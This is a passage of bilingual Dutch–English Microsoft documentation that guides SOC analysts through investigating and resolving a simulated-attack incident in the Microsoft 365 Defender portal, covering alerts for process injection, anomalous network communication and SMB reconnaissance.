<span data-ttu-id="0e43b-207">Microsoft 365 Defender worden analyses gecorreleerd en worden alle gerelateerde waarschuwingen en onderzoeken van verschillende producten samengevoegd tot één incidententiteit.</span><span class="sxs-lookup"><span data-stu-id="0e43b-207">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="0e43b-208">Op deze Microsoft 365 Defender een breder aanvalsverhaal, zodat de SOC-analist complexe bedreigingen begrijpt en beantwoordt.</span><span class="sxs-lookup"><span data-stu-id="0e43b-208">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="0e43b-209">De waarschuwingen die tijdens deze simulatie worden gegenereerd, worden gekoppeld aan dezelfde bedreiging en worden als gevolg hiervan automatisch samengevoegd als één incident.</span><span class="sxs-lookup"><span data-stu-id="0e43b-209">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="0e43b-210">Het incident weergeven:</span><span class="sxs-lookup"><span data-stu-id="0e43b-210">To view the incident:</span></span>

1. <span data-ttu-id="0e43b-211">Open de [Microsoft 365 Defender portal](https://security.microsoft.com/).</span><span class="sxs-lookup"><span data-stu-id="0e43b-211">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="0e43b-212">Selecteer in het navigatiedeelvenster de optie **Incidenten & waarschuwingen > incidenten.**</span><span class="sxs-lookup"><span data-stu-id="0e43b-212">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="0e43b-213">Selecteer het nieuwste item door op de cirkel links van de naam van het incident te klikken.</span><span class="sxs-lookup"><span data-stu-id="0e43b-213">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="0e43b-214">Een zijpaneel bevat aanvullende informatie over het incident, inclusief alle gerelateerde waarschuwingen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-214">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="0e43b-215">Elk incident heeft een unieke naam die het beschrijft op basis van de kenmerken van de waarschuwingen die het bevat.</span><span class="sxs-lookup"><span data-stu-id="0e43b-215">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   <span data-ttu-id="0e43b-216">De waarschuwingen die in het dashboard worden weergegeven, kunnen worden gefilterd op basis van servicebronnen: Microsoft Defender voor identiteit, Microsoft Cloud App Security, Microsoft Defender voor Eindpunt, Microsoft 365 Defender en Microsoft Defender voor Office 365.</span><span class="sxs-lookup"><span data-stu-id="0e43b-216">The alerts that are shown in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="0e43b-217">Selecteer **De pagina Incident openen** voor meer informatie over het incident.</span><span class="sxs-lookup"><span data-stu-id="0e43b-217">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="0e43b-218">Op de **pagina Incident** ziet u alle waarschuwingen en informatie over het incident.</span><span class="sxs-lookup"><span data-stu-id="0e43b-218">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="0e43b-219">De informatie omvat de entiteiten en activa die betrokken zijn bij de waarschuwing, de detectiebron van de waarschuwingen (zoals Microsoft Defender voor identiteit of Microsoft Defender voor Eindpunt) en de reden waarom ze aan elkaar zijn gekoppeld.</span><span class="sxs-lookup"><span data-stu-id="0e43b-219">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (such as Microsoft Defender for Identity or Microsoft Defender for Endpoint), and the reason they were linked together.</span></span> <span data-ttu-id="0e43b-220">Als u de lijst met incidentenwaarschuwingen bekijkt, wordt de voortgang van de aanval weergegeven.</span><span class="sxs-lookup"><span data-stu-id="0e43b-220">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="0e43b-221">In deze weergave kunt u de afzonderlijke waarschuwingen bekijken en onderzoeken.</span><span class="sxs-lookup"><span data-stu-id="0e43b-221">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="0e43b-222">U kunt ook in **het rechtermenu** op Incident beheren klikken om het incident te taggen, aan uzelf toe te wijzen en opmerkingen toe te voegen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-222">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

#### <a name="review-generated-alerts"></a><span data-ttu-id="0e43b-223">Gegenereerde waarschuwingen controleren</span><span class="sxs-lookup"><span data-stu-id="0e43b-223">Review generated alerts</span></span>

<span data-ttu-id="0e43b-224">Laten we eens kijken naar enkele waarschuwingen die tijdens de gesimuleerde aanval zijn gegenereerd.</span><span class="sxs-lookup"><span data-stu-id="0e43b-224">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="0e43b-225">We lopen door slechts een paar waarschuwingen die tijdens de gesimuleerde aanval zijn gegenereerd.</span><span class="sxs-lookup"><span data-stu-id="0e43b-225">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="0e43b-226">Afhankelijk van de versie van Windows en de Microsoft 365 Defender producten die op uw testapparaat worden uitgevoerd, ziet u mogelijk meer waarschuwingen die in een iets andere volgorde worden weergegeven.</span><span class="sxs-lookup"><span data-stu-id="0e43b-226">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Voorbeeld van de gegenereerde waarschuwingen](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="0e43b-228">Waarschuwing: Verdachte procesinjectie waargenomen (bron: Microsoft Defender voor eindpunt)</span><span class="sxs-lookup"><span data-stu-id="0e43b-228">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="0e43b-229">Geavanceerde aanvallers gebruiken geavanceerde en verborgen methoden om in het geheugen te blijven en zich te verbergen voor detectiehulpmiddelen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-229">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="0e43b-230">Een veelgebruikte techniek is om te werken vanuit een vertrouwd systeemproces in plaats van een schadelijke uitvoerbare, waardoor het moeilijk is voor detectiehulpmiddelen en beveiligingsbewerkingen om de schadelijke code te herkennen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-230">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="0e43b-231">Om de SOC-analisten in staat te stellen deze geavanceerde aanvallen op te vangen, bieden diep geheugen sensoren in Microsoft Defender voor Eindpunt onze cloudservice een ongeëvenaarde zichtbaarheid in een verscheidenheid aan technieken voor codeinjectie voor meerdere processen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-231">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="0e43b-232">In de volgende afbeelding ziet u hoe Defender voor Eindpunt heeft gedetecteerd en gewaarschuwd bij de poging om code te <i>notepad.exe. </i></span><span class="sxs-lookup"><span data-stu-id="0e43b-232">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Voorbeeld van de waarschuwing voor het invoeren van potentieel schadelijke code](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="0e43b-234">Waarschuwing: Onverwacht gedrag waargenomen door een proces zonder opdrachtregelargumenten (Bron: Microsoft Defender voor eindpunt)</span><span class="sxs-lookup"><span data-stu-id="0e43b-234">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="0e43b-235">Microsoft Defender voor eindpuntdetecties zijn vaak gericht op het meest voorkomende kenmerk van een aanvalstechniek.</span><span class="sxs-lookup"><span data-stu-id="0e43b-235">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="0e43b-236">Deze methode zorgt voor duurzaamheid en verhoogt de lat voor aanvallers om over te schakelen naar nieuwere tactieken.</span><span class="sxs-lookup"><span data-stu-id="0e43b-236">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="0e43b-237">We gebruiken grootschalige leeralgoritmen om het normale gedrag van gangbare processen binnen een organisatie en wereldwijd vast te stellen en te kijken wanneer deze processen afwijkende gedragingen vertonen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-237">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="0e43b-238">Deze afwijkende gedragingen geven vaak aan dat overbodige code is geïntroduceerd en wordt uitgevoerd in een anders vertrouwd proces.</span><span class="sxs-lookup"><span data-stu-id="0e43b-238">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="0e43b-239">In dit scenario vertoont <i>notepad.exe</i> abnormaal gedrag, waarbij communicatie met een externe locatie betrokken is.</span><span class="sxs-lookup"><span data-stu-id="0e43b-239">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="0e43b-240">Dit resultaat is onafhankelijk van de specifieke methode die wordt gebruikt om de schadelijke code in te voeren en uit te voeren.</span><span class="sxs-lookup"><span data-stu-id="0e43b-240">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="0e43b-241">Omdat deze waarschuwing is gebaseerd op machine learning-modellen waarvoor extra back-endverwerking nodig is, kan het enige tijd duren voordat u deze waarschuwing in de portal ziet.</span><span class="sxs-lookup"><span data-stu-id="0e43b-241">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="0e43b-242">De waarschuwingsdetails bevatten het externe IP-adres, een indicator die u als draaipunt kunt gebruiken om het onderzoek uit te breiden.</span><span class="sxs-lookup"><span data-stu-id="0e43b-242">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="0e43b-243">Selecteer het IP-adres in de waarschuwingsprocesstructuur om de pagina MET IP-adresgegevens weer te geven.</span><span class="sxs-lookup"><span data-stu-id="0e43b-243">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![Voorbeeld van de waarschuwing voor onverwacht gedrag door een proces zonder opdrachtregelargumenten](../../media/mtp/fig8.png)

<span data-ttu-id="0e43b-245">In de volgende afbeelding ziet u de geselecteerde pagina MET IP-adresgegevens (klikken op IP-adres in de processtructuur Waarschuwing).</span><span class="sxs-lookup"><span data-stu-id="0e43b-245">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>

![Voorbeeld van de pagina IP-adresgegevens](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="0e43b-247">Waarschuwing: Verkenning van gebruikers- en IP-adres (SMB) (Bron: Microsoft Defender voor identiteit)</span><span class="sxs-lookup"><span data-stu-id="0e43b-247">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="0e43b-248">Door een SMB-protocol (Server Message Block) te gebruiken, kunnen aanvallers recente gebruikerslogengegevens krijgen waarmee ze lateraal door het netwerk kunnen gaan om toegang te krijgen tot een specifiek gevoelig account.</span><span class="sxs-lookup"><span data-stu-id="0e43b-248">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="0e43b-249">In deze detectie wordt een waarschuwing geactiveerd wanneer de SMB-sessie-overzicht wordt uitgevoerd tegen een domeincontroller.</span><span class="sxs-lookup"><span data-stu-id="0e43b-249">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Voorbeeld van de microsoft defender voor identiteitswaarschuwing voor verkenning van gebruikers- en IP-adressen](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a><span data-ttu-id="0e43b-251">De tijdlijn van het apparaat bekijken met Microsoft Defender voor Eindpunt</span><span class="sxs-lookup"><span data-stu-id="0e43b-251">Review the device timeline with Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="0e43b-252">Nadat u de verschillende waarschuwingen in dit incident hebt verkend, gaat u terug naar de pagina met incidenten die u eerder hebt onderzocht.</span><span class="sxs-lookup"><span data-stu-id="0e43b-252">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="0e43b-253">Selecteer het **tabblad Apparaten** op de pagina met incidenten om de apparaten te bekijken die betrokken zijn bij dit incident, zoals gerapporteerd door Microsoft Defender voor Eindpunt en Microsoft Defender voor identiteit.</span><span class="sxs-lookup"><span data-stu-id="0e43b-253">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="0e43b-254">Selecteer de naam van het apparaat waarop de aanval is uitgevoerd om de entiteitspagina voor dat specifieke apparaat te openen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-254">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="0e43b-255">Op die pagina ziet u waarschuwingen die zijn geactiveerd en gerelateerde gebeurtenissen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-255">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="0e43b-256">Selecteer het **tabblad Tijdlijn** om de tijdlijn van het apparaat te openen en alle gebeurtenissen en gedragingen op het apparaat in chronologische volgorde weer te geven, afgewisseld met de waarschuwingen die zijn opgeheven.</span><span class="sxs-lookup"><span data-stu-id="0e43b-256">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Voorbeeld van de apparaattijdlijn met gedrag](../../media/mtp/fig11.png)

<span data-ttu-id="0e43b-258">Het uitbreiden van een aantal interessantere gedragingen biedt nuttige details, zoals procesbomen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-258">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="0e43b-259">Schuif bijvoorbeeld omlaag totdat u de meldingsgebeurtenis Verdachte **procesinjectie hebt waargenomen.**</span><span class="sxs-lookup"><span data-stu-id="0e43b-259">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="0e43b-260">Selecteer de **powershell.exe** die is notepad.exe procesgebeurtenis eronder, om de volledige processtructuur voor dit gedrag weer te geven onder de grafiek **Gebeurtenis-entiteiten** in het zijdeelvenster.</span><span class="sxs-lookup"><span data-stu-id="0e43b-260">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="0e43b-261">Gebruik de zoekbalk om zo nodig te filteren.</span><span class="sxs-lookup"><span data-stu-id="0e43b-261">Use the search bar for filtering if necessary.</span></span>

![Voorbeeld van de processtructuur voor geselecteerd PowerShell-bestandscreatiegedrag](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-cloud-app-security"></a><span data-ttu-id="0e43b-263">Bekijk de gebruikersgegevens met Microsoft Cloud App Security</span><span class="sxs-lookup"><span data-stu-id="0e43b-263">Review the user information with Microsoft Cloud App Security</span></span>

<span data-ttu-id="0e43b-264">Selecteer op de pagina Incident het tabblad **Gebruikers** om de lijst weer te geven met gebruikers die betrokken zijn bij de aanval.</span><span class="sxs-lookup"><span data-stu-id="0e43b-264">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="0e43b-265">De tabel bevat aanvullende informatie over elke gebruiker, inclusief de prioriteitsscore voor **onderzoek van elke** gebruiker.</span><span class="sxs-lookup"><span data-stu-id="0e43b-265">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="0e43b-266">Selecteer de gebruikersnaam om de profielpagina van de gebruiker te openen, waar verder onderzoek kan worden uitgevoerd.</span><span class="sxs-lookup"><span data-stu-id="0e43b-266">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="0e43b-267">[Lees meer over het onderzoeken van risicovolle gebruikers.](/cloud-app-security/tutorial-ueba#identify)</span><span class="sxs-lookup"><span data-stu-id="0e43b-267">[Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).</span></span>

![Voorbeeld van Cloud App Security gebruikerspagina](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a><span data-ttu-id="0e43b-269">Geautomatiseerd onderzoek en herstel</span><span class="sxs-lookup"><span data-stu-id="0e43b-269">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="0e43b-270">Voordat we u door deze simulatie leiden, bekijkt u de volgende video om vertrouwd te raken met wat geautomatiseerde zelfherstel is, waar u deze kunt vinden in de portal en hoe deze kan helpen bij uw beveiligingsbewerkingen:</span><span class="sxs-lookup"><span data-stu-id="0e43b-270">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="0e43b-271">Ga terug naar het incident in de Microsoft 365 Defender portal.</span><span class="sxs-lookup"><span data-stu-id="0e43b-271">Navigate back to the incident in the Microsoft 365 Defender portal.</span></span> <span data-ttu-id="0e43b-272">Op **het tabblad Onderzoeken** op de pagina **Incident** ziet u de geautomatiseerde onderzoeken die zijn gestart door Microsoft Defender voor identiteit en Microsoft Defender voor Eindpunt.</span><span class="sxs-lookup"><span data-stu-id="0e43b-272">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="0e43b-273">In de onderstaande schermafbeelding wordt alleen het geautomatiseerde onderzoek weergegeven dat is geactiveerd door Defender voor Eindpunt.</span><span class="sxs-lookup"><span data-stu-id="0e43b-273">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="0e43b-274">Standaard worden in Defender voor Eindpunt automatisch de artefacten in de wachtrij gesaneerd, wat herstel vereist.</span><span class="sxs-lookup"><span data-stu-id="0e43b-274">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![Voorbeeld van de geautomatiseerde onderzoeken met betrekking tot het incident](../../media/mtp/fig14.png)

<span data-ttu-id="0e43b-276">Selecteer de waarschuwing die een onderzoek heeft geactiveerd om de pagina **Details van het onderzoek te** openen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-276">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="0e43b-277">U ziet de volgende details:</span><span class="sxs-lookup"><span data-stu-id="0e43b-277">You'll see the following details:</span></span>

- <span data-ttu-id="0e43b-278">Waarschuwing(s) die het geautomatiseerde onderzoek hebben geactiveerd.</span><span class="sxs-lookup"><span data-stu-id="0e43b-278">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="0e43b-279">Beïnvloede gebruikers en apparaten.</span><span class="sxs-lookup"><span data-stu-id="0e43b-279">Impacted users and devices.</span></span> <span data-ttu-id="0e43b-280">Als er indicatoren worden gevonden op extra apparaten, worden deze extra apparaten ook weergegeven.</span><span class="sxs-lookup"><span data-stu-id="0e43b-280">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="0e43b-281">Lijst met bewijs.</span><span class="sxs-lookup"><span data-stu-id="0e43b-281">List of evidence.</span></span> <span data-ttu-id="0e43b-282">De entiteiten die zijn gevonden en geanalyseerd, zoals bestanden, processen, services, stuurprogramma's en netwerkadressen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-282">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="0e43b-283">Deze entiteiten worden geanalyseerd op mogelijke relaties met de waarschuwing en beoordeeld als goedaardig of schadelijk.</span><span class="sxs-lookup"><span data-stu-id="0e43b-283">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="0e43b-284">Bedreigingen gevonden.</span><span class="sxs-lookup"><span data-stu-id="0e43b-284">Threats found.</span></span> <span data-ttu-id="0e43b-285">Bekende bedreigingen die tijdens het onderzoek worden gevonden.</span><span class="sxs-lookup"><span data-stu-id="0e43b-285">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="0e43b-286">Afhankelijk van de tijdsinstelling wordt het geautomatiseerde onderzoek mogelijk nog uitgevoerd.</span><span class="sxs-lookup"><span data-stu-id="0e43b-286">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="0e43b-287">Wacht enkele minuten totdat het proces is voltooid voordat u het bewijs verzamelt en analyseert en de resultaten bekijkt.</span><span class="sxs-lookup"><span data-stu-id="0e43b-287">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="0e43b-288">Vernieuw **de pagina Onderzoeksdetails** om de meest recente resultaten te krijgen.</span><span class="sxs-lookup"><span data-stu-id="0e43b-288">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Voorbeeld van de pagina Details van onderzoek](../../media/mtp/fig15.png)

<span data-ttu-id="0e43b-290">Tijdens het geautomatiseerde onderzoek heeft Microsoft Defender voor Eindpunt de notepad.exe geïdentificeerd, die is geïnjecteerd als een van de artefacten die moeten worden gesaneerd.</span><span class="sxs-lookup"><span data-stu-id="0e43b-290">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="0e43b-291">Defender voor Eindpunt stopt automatisch de verdachte procesinjectie als onderdeel van de automatische herstelprocedure.</span><span class="sxs-lookup"><span data-stu-id="0e43b-291">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="0e43b-292">U kunt zien <i>notepad.exe</i> verdwijnen uit de lijst met lopende processen op het testapparaat.</span><span class="sxs-lookup"><span data-stu-id="0e43b-292">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

#### <a name="resolve-the-incident"></a><span data-ttu-id="0e43b-293">Het incident oplossen</span><span class="sxs-lookup"><span data-stu-id="0e43b-293">Resolve the incident</span></span>

<span data-ttu-id="0e43b-294">Nadat het onderzoek is voltooid en is bevestigd dat het is opgelost, lost u het incident op.</span><span class="sxs-lookup"><span data-stu-id="0e43b-294">After the investigation is complete and confirmed to be remediated, you resolve the incident.</span></span>

<span data-ttu-id="0e43b-295">Selecteer op **de pagina Incident** de optie Incident **beheren.**</span><span class="sxs-lookup"><span data-stu-id="0e43b-295">From the **Incident** page, select **Manage incident**.</span></span> <span data-ttu-id="0e43b-296">Stel de status in op **Incident oplossen** en selecteer **Waar-waarschuwing** voor de classificatie en **beveiligingstests** voor de bepaling.</span><span class="sxs-lookup"><span data-stu-id="0e43b-296">Set the status to **Resolve incident** and select **True alert** for the classification and **Security testing** for the determination.</span></span>

![Voorbeeld van de pagina incidenten met het geopende deelvenster Incident beheren waar u op de schakelknop kunt klikken om incidenten op te lossen](../../media/mtp/fig16.png)

<span data-ttu-id="0e43b-298">Wanneer het incident is opgelost, worden alle bijbehorende waarschuwingen in Microsoft 365 Defender portal en in de gerelateerde portals opgelost.</span><span class="sxs-lookup"><span data-stu-id="0e43b-298">When the incident is resolved, it resolves all of the associated alerts in Microsoft 365 Defender portal and in the related portals.</span></span>

<span data-ttu-id="0e43b-299">Hiermee wordt de aanvalssimulatie voor incidentanalyse, geautomatiseerd onderzoek en incidentoplossing afgerond.</span><span class="sxs-lookup"><span data-stu-id="0e43b-299">This wraps up the attack simulation for incident analysis, automated investigation, and incident resolution.</span></span>

## <a name="next-step"></a><span data-ttu-id="0e43b-300">Volgende stap</span><span class="sxs-lookup"><span data-stu-id="0e43b-300">Next step</span></span>

<span data-ttu-id="0e43b-301">[![Probeer Microsoft 365 Defender mogelijkheden voor incidentrespons uit te proberen](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="0e43b-301">[![Try Microsoft 365 Defender incident response capabilities](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span></span>

<span data-ttu-id="0e43b-302">Stap 2 van 2: [Probeer Microsoft 365 Defender mogelijkheden voor incidentrespons](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="0e43b-302">Step 2 of 2: [Try Microsoft 365 Defender incident response capabilities](eval-defender-investigate-respond-additional.md)</span></span>

### <a name="navigation-you-may-need"></a><span data-ttu-id="0e43b-303">Navigatie die u mogelijk nodig hebt</span><span class="sxs-lookup"><span data-stu-id="0e43b-303">Navigation you may need</span></span>

[<span data-ttu-id="0e43b-304">De Microsoft 365 Defender evaluatieomgeving maken</span><span class="sxs-lookup"><span data-stu-id="0e43b-304">Create the Microsoft 365 Defender Evaluation Environment</span></span>](eval-create-eval-environment.md)
